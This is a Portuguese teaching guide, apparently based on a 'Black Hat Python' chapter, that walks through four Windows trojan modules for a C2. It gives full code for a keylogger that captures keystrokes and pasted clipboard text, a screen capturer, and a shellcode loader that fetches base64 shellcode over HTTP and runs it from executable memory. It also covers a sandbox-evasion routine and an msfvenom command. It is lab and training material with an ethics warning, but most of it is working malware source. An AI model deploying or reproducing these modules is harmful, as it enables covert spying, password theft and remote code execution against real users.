# Guia Prático Completo: Tarefas Comuns de Trojan no Windows (Cap. 8)

**Laboratório Prático:** BHT Lab — VM Windows 10/11 (snapshot limpo)
**Ambiente de Testes:** Python 3.6–3.11 + `pyWinhook`, `pywin32` (Windows-only)
**Código de Apoio:** `keylogger.py`, `screenshotter.py`, `shell_exec.py`, `sandbox_detect.py`
**Fonte fiel:** `black-hat-python-cap8-trojaning-windows.md`

---

> ⚠️ **Aviso de Responsabilidade e Ética Profissional**
> Todos os scripts deste guia são **Windows-only** e exigem privilégio elevado para hooks.
> Execute apenas em máquina virtual de laboratório, com autorização do professor e snapshot para reversão.
> Qualquer execução contra sistemas de terceiros sem autorização prévia por escrito é ilegal, nos termos do **Marco Civil da Internet (Lei nº 12.965/2014)** e do **Artigo 154-A do Código Penal Brasileiro**.

---

## 1. O Cenário: 4 Módulos Plugáveis no C2

Este capítulo entrega 4 módulos que plugam no trojan do Cap. 7. Cada um expõe (ou é adaptado para) `run()`:

```text
[Cap.7 C2] -- importa --> [keylogger.run() = string de teclas]
           -- importa --> [screenshotter.run() = bytes do .bmp]
           -- importa --> [shell_exec.run(shellcode) = executa em RAM]
           -- importa --> [sandbox_detect.detect() = sai se for VM fria]
```

| Módulo | Função | Dependências |
| :--- | :--- | :--- |
| `keylogger.py` | Captura teclas + clipboard | `pyWinhook`, `pywin32`, `pythoncom` |
| `screenshotter.py` | Captura tela via GDI | `pywin32` |
| `shell_exec.py` | Executa shellcode em memória | `ctypes` (nativo) |
| `sandbox_detect.py` | Detecta sandbox via input | `pywin32` |

Dependências:
```cmd
pip install pyWinhook pywin32
```

---

## 2. Módulo 8.1 — Keylogger `keylogger.py`

Captura teclas associando a processo/janela ativos + clipboard em `Ctrl+V`.

### 2.1 Código resumido + análise

```python
 1 | from ctypes import byref, create_string_buffer, c_ulong, windll
 2 | from io import StringIO
 3 |
 4 | import os
 5 | import pythoncom
 6 | import pyWinhook as pyHook
 7 | import sys
 8 | import time
 9 | import win32clipboard
10 |
11 | TIMEOUT = 60 * 10
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `1` | `from ctypes import ... windll` | Acesso à API Windows (janela, processo). |
| `2` | `from io import StringIO` | Buffer para redirecionar `stdout`. |
| `5–6` | `pythoncom + pyHook` | Loop COM + hooks de teclado. |
| `9` | `win32clipboard` | Lê clipboard no `Ctrl+V`. |
| `11` | `TIMEOUT = 600` | Janela de captura de 10 minutos. |

```python
12 | class KeyLogger:
13 |     def __init__(self):
14 |         self.current_window = None
15 |
16 |     def get_current_process(self):
17 |         hwnd = windll.user32.GetForegroundWindow()
18 |         pid = c_ulong(0)
19 |         windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
20 |         process_id = f'{pid.value}'
21 |         executable = create_string_buffer(512)
22 |         h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
23 |         windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
24 |         window_title = create_string_buffer(512)
25 |         windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
26 |         try:
27 |             self.current_window = window_title.value.decode()
28 |         except UnicodeDecodeError as e:
29 |             print(f'{e}: window name unknown')
30 |         print('\n', process_id, executable.value.decode(), self.current_window)
31 |         windll.kernel32.CloseHandle(hwnd)
32 |         windll.kernel32.CloseHandle(h_process)
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `17` | `GetForegroundWindow()` | Handle da janela ativa. |
| `18–20` | `GetWindowThreadProcessId` | Obtém PID da janela. |
| `22–23` | `OpenProcess + GetModuleBaseNameA` | Nome do `.exe` dono da janela. |
| `24–25` | `GetWindowTextA` | Título da janela. |
| `26–29` | `try/except UnicodeDecodeError` | Trata títulos não-UTF8. |
| `31–32` | `CloseHandle` | Libera handles. |

```python
33 |     def mykeystroke(self, event):
34 |         if event.WindowName != self.current_window:
35 |             self.get_current_process()
36 |         if 32 < event.Ascii < 127:
37 |             print(chr(event.Ascii), end='')
38 |         else:
39 |             if event.Key == 'V':
40 |                 win32clipboard.OpenClipboard()
41 |                 value = win32clipboard.GetClipboardData()
42 |                 win32clipboard.CloseClipboard()
43 |                 print(f'[PASTE] - {value}')
44 |             else:
45 |                 print(f'[event.Key]')
46 |         return True
47 |
48 | def run():
49 |     save_stdout = sys.stdout
50 |     sys.stdout = StringIO()
51 |     kl = KeyLogger()
52 |     hm = pyHook.HookManager()
53 |     hm.KeyDown = kl.mykeystroke
54 |     hm.HookKeyboard()
55 |     while time.thread_time() < TIMEOUT:
56 |         pythoncom.PumpWaitingMessages()
57 |     log = sys.stdout.getvalue()
58 |     sys.stdout = save_stdout
59 |     return log
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `34–35` | Detecta troca de janela | Atualiza processo/janela quando muda. |
| `36–37` | `32 < Ascii < 127` | Imprime caractere legível. |
| `39–43` | `Key == 'V'` | Em colar, lê clipboard. |
| `46` | `return True` | Permite próximo evento do hook. |
| `49–50` | `sys.stdout = StringIO()` | Redireciona prints para buffer. |
| `52–54` | `HookManager + HookKeyboard` | Instala hook global. |
| `55–56` | `while thread_time < TIMEOUT` | Loop COM até timeout. |
| `57–59` | Recupera log e restaura stdout | Devolve string para o C2. |

> 📌 **Bug didático:** `time.thread_time()` é tempo de CPU da thread, não de parede. Como a thread bloqueia em `PumpWaitingMessages()`, pode rodar horas. Na integração usamos `time.time() - start < TIMEOUT`.

---

## 3. Módulo 8.2 — Screenshot `screenshotter.py`

Captura tela virtual (múltiplos monitores) via GDI e salva `.bmp`.

```python
 1 | import base64
 2 | import win32api
 3 | import win32con
 4 | import win32gui
 5 | import win32ui
 6 |
 7 | def get_dimensions():
 8 |     width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
 9 |     height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
10 |     left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
11 |     top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
12 |     return (width, height, left, top)
13 |
14 | def screenshot(name='screenshot'):
15 |     hdesktop = win32gui.GetDesktopWindow()
16 |     width, height, left, top = get_dimensions()
17 |     desktop_dc = win32gui.GetWindowDC(hdesktop)
18 |     img_dc = win32ui.CreateDCFromHandle(desktop_dc)
19 |     mem_dc = img_dc.CreateCompatibleDC()
20 |     screenshot = win32ui.CreateBitmap()
21 |     screenshot.CreateCompatibleBitmap(img_dc, width, height)
22 |     mem_dc.SelectObject(screenshot)
23 |     mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
24 |     screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')
25 |     mem_dc.DeleteDC()
26 |     win32gui.DeleteObject(screenshot.GetHandle())
27 |
28 | def run():
29 |     screenshot()
30 |     with open('screenshot.bmp') as f:
31 |         img = f.read()
32 |     return img
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `7–12` | `get_dimensions()` | Largura/altura/offset da tela virtual. |
| `15` | `GetDesktopWindow()` | Handle do desktop. |
| `17–19` | `GetWindowDC + CreateDC + CreateCompatibleDC` | Cria DC em memória. |
| `20–22` | `CreateBitmap + SelectObject` | Bitmap compatível selecionado. |
| `23` | `BitBlt(..., SRCCOPY)` | Copia pixels da tela para memória. |
| `24` | `SaveBitmapFile` | Salva `.bmp` em disco. |
| `25–26` | `DeleteDC + DeleteObject` | Evita vazamento de GDI. |
| `29–32` | `run()` | Captura, lê bytes e retorna (para `store_module_result`). |

---

## 4. Módulo 8.3 — Shellcode `shell_exec.py`

Baixa shellcode em base64 via HTTP, aloca RWX e executa sem disco.

```python
 1 | import base64
 2 | import ctypes
 3 | from urllib import request
 4 |
 5 | kernel32 = ctypes.windll.kernel32
 6 |
 7 | def get_code(url):
 8 |     with request.urlopen(url) as response:
 9 |         shellcode = base64.decodebytes(response.read())
10 |     return shellcode
11 |
12 | def write_memory(buf):
13 |     length = len(buf)
14 |     kernel32.VirtualAlloc.restype = ctypes.c_void_p
15 |     kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
16 |     ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
17 |     kernel32.RtlMoveMemory(ptr, buf, length)
18 |     return ptr
19 |
20 | def run(shellcode):
21 |     buffer = ctypes.create_string_buffer(shellcode)
22 |     ptr = write_memory(buffer)
23 |     shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
24 |     shell_func()
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `5` | `kernel32 = ctypes.windll.kernel32` | Acesso à DLL nativa. |
| `8–9` | `urlopen + b64decode` | Baixa e decodifica shellcode. |
| `14–15` | `restype/argtypes` | Declara assinaturas para `ctypes`. |
| `16` | `VirtualAlloc(None, len, 0x3000, 0x40)` | Aloca RWX (`0x40` = EXECUTE_READWRITE). |
| `17` | `RtlMoveMemory` | Copia shellcode para região executável. |
| `21–24` | `create_string_buffer + cast + call` | Trata ponteiro como função e executa. |

Gerar shellcode de laboratório (Kali do professor):
```bash
msfvenom -p windows/exec -e x86/shikata_ga_nai -i 1 -f raw cmd=calc.exe > shellcode.raw
base64 -w 0 -i shellcode.raw > shellcode.bin
python -m http.server 8100
```

---

## 5. Módulo 8.4 — Sandbox Detection `sandbox_detect.py`

Detecta sandbox por falta de interação humana (teclas, cliques, double-clicks, `GetLastInputInfo`).

```python
 1 | from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
 2 | import random
 3 | import sys
 4 | import time
 5 | import win32api
 6 |
 7 | class LASTINPUTINFO(Structure):
 8 |     _fields_ = [('cbSize', c_uint), ('dwTime', c_ulong)]
 9 |
10 | def get_last_input():
11 |     struct_lastinputinfo = LASTINPUTINFO()
12 |     struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)
13 |     windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
14 |     run_time = windll.kernel32.GetTickCount()
15 |     elapsed = run_time - struct_lastinputinfo.dwTime
16 |     print(f"[*] It's been {elapsed} milliseconds since the last event.")
17 |     return elapsed
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `7–8` | `LASTINPUTINFO` | Struct Windows com `cbSize` + `dwTime`. |
| `13–17` | `GetLastInputInfo + GetTickCount` | ms desde último input; se `>= 30000`, `sys.exit(0)`. |

```python
18 | class Detector:
19 |     def __init__(self):
20 |         self.double_clicks = 0
21 |         self.keystrokes = 0
22 |         self.mouse_clicks = 0
23 |
24 |     def get_key_press(self):
25 |         for i in range(0, 0xff):
26 |             state = win32api.GetAsyncKeyState(i)
27 |             if state & 0x0001:
28 |                 if i == 0x1:
29 |                     self.mouse_clicks += 1
30 |                     return time.time()
31 |                 elif i > 32 and i < 127:
32 |                     self.keystrokes += 1
33 |         return None
34 |
35 |     def detect(self):
36 |         previous_timestamp = None
37 |         first_double_click = None
38 |         double_click_threshold = 0.35
39 |         max_double_clicks = 10
40 |         max_keystrokes = random.randint(10, 25)
41 |         max_mouse_clicks = random.randint(5, 25)
42 |         max_input_threshold = 30000
43 |         last_input = get_last_input()
44 |         if last_input >= max_input_threshold:
45 |             sys.exit(0)
46 |         detection_complete = False
47 |         while not detection_complete:
48 |             keypress_time = self.get_key_press()
49 |             if keypress_time is not None and previous_timestamp is not None:
50 |                 elapsed = keypress_time - previous_timestamp
51 |                 if elapsed <= double_click_threshold:
52 |                     self.mouse_clicks -= 2
53 |                     self.double_clicks += 1
54 |                     if self.double_clicks >= max_double_clicks:
55 |                         if (keypress_time - first_double_click <= (max_double_clicks * double_click_threshold)):
56 |                             sys.exit(0)
57 |                 if (self.keystrokes >= max_keystrokes and self.double_clicks >= max_double_clicks and self.mouse_clicks >= max_mouse_clicks):
58 |                     detection_complete = True
59 |             elif keypress_time is not None:
60 |                 previous_timestamp = keypress_time
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `26–32` | `GetAsyncKeyState` em `0x00–0xFF` | Conta cliques (`0x1`) e teclas ASCII. |
| `40–42` | Thresholds aleatórios | Evita assinatura fixa. |
| `44–45` | `last_input >= 30000` | Sem humano por 30s → sandbox → sai. |
| `51–56` | Double-click rápido demais | Sequência mecânica → sandbox → sai. |
| `57–58` | Todos thresholds batidos | Humano confirmado → libera trojan. |

---

## 6. Procedimento de Execução no Terminal (VM Windows)

1. Instale dependências:
   ```cmd
   pip install pyWinhook pywin32
   ```
2. Teste isolado (um módulo por vez):
   ```cmd
   python keylogger.py
   python screenshotter.py
   python sandbox_detect.py
   ```
   *Não rode `shell_exec.py` sem o professor — ele executa código em memória.*
3. **Saída esperada do keylogger (digite por 1 min e aguarde):**
   ```text
   1234 notepad.exe Untitled - Notepad
   ola mundo[PASTE] - senha123
   done.
   ```

> 📌 **Integração:** para plugar no C2, garanta `def run(**args)` (keylogger adaptado no módulo 03) e adicione o nome ao `abc.json`. O `screenshotter.run()` deve abrir em modo binário (`"rb"`) para `.bmp` real.
